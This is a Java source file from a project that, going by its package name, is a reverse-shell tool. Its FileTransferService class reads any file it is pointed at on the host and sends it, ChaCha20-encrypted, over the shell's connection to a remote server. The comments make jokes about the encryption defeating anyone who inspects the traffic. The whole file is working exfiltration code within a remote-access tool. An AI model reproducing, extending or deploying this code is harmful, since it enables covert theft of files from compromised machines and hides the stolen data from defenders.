package obs1d1anc1ph3r.reverseshell.utils;

import java.io.File;
import java.nio.file.Files;
import obs1d1anc1ph3r.reverseshell.ServerConnection;
import obs1d1anc1ph3r.reverseshell.encryption.ChaCha20;

public class FileTransferService {

	//Ooo, it's encrypted now, can't decrypt this losersssss
	public void sendEncryptedFile(File file, ServerConnection serverConnection) throws Exception {
		if (!file.exists() || !file.isFile()) {
			serverConnection.sendEncryptedResponse("Error: File not found: " + file.getAbsolutePath());
			return;
		}

		if (!file.canRead()) { //Then it's just like me (I am illiterate)
			serverConnection.sendEncryptedResponse("Error: File is not readable: " + file.getAbsolutePath());
			return;
		}

		byte[] fileBytes = Files.readAllBytes(file.toPath());
		byte[] nonce = ChaCha20.generateNonce(); //Stupid hat
		byte[] encryptedFileBytes = ChaCha20.encrypt(serverConnection.getSessionKey(), nonce, fileBytes);

		serverConnection.sendEncryptedResponse("file download"); //Server needs to know what's up

		serverConnection.getDataOut().writeUTF(file.getName()); //Server needs to know the file name

		serverConnection.getDataOut().writeInt(nonce.length); //Stupid hat.length
		serverConnection.getDataOut().write(nonce); //Sever needs to know the stupid hat

		serverConnection.getDataOut().writeInt(encryptedFileBytes.length); //Server needs to know the file size
		serverConnection.getDataOut().write(encryptedFileBytes); //Server needs the bytes
		serverConnection.getDataOut().flush(); //Again, gross if you don't
	}
}
